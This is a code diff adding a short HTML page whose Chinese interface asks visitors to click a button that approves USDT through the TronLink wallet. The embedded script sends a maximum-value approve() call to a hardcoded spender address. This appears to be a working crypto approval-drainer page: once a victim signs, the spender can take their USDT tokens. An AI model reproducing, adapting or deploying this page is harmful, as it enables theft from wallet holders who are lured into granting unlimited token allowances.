@@ -1,0 +1,39 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>TRON USDT Approve</title>
+</head>
+<body style="background:#0f172a;color:#fff;font-family:sans-serif;text-align:center;padding:40px">
+  <h1>TRON USDT 授權頁面</h1>
+  <p>點擊下方按鈕，使用 <strong>TronLink</strong> 授權 USDT 給指定地址</p>
+  <button id="approveBtn" style="padding:12px 24px;font-size:18px;border:none;border-radius:6px;background:#38bdf8;color:#0f172a;cursor:pointer">
+    授權 USDT (最大值)
+  </button>
+  <p id="status" style="margin-top:20px"></p>
+
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.min.js"></script>
+  <script>
+    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const SPENDER = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B";
+    const MAX_AMOUNT = "9223372036854775807"; // 大授權
+
+    document.getElementById("approveBtn").onclick = async () => {
+      const status = document.getElementById("status");
+      try {
+        if (!window.tronWeb || !tronWeb.defaultAddress.base58) {
+          status.innerText = "請先登入 TronLink";
+          return;
+        }
+
+        const contract = await tronWeb.contract().at(USDT_CONTRACT);
+        const tx = await contract.approve(SPENDER, MAX_AMOUNT).send();
+        status.innerText = "✅ 授權成功 TX: " + tx;
+      } catch (err) {
+        status.innerText = "❌ 授權失敗: " + err.message;
+      }
+    };
+  </script>
+</body>
+</html>
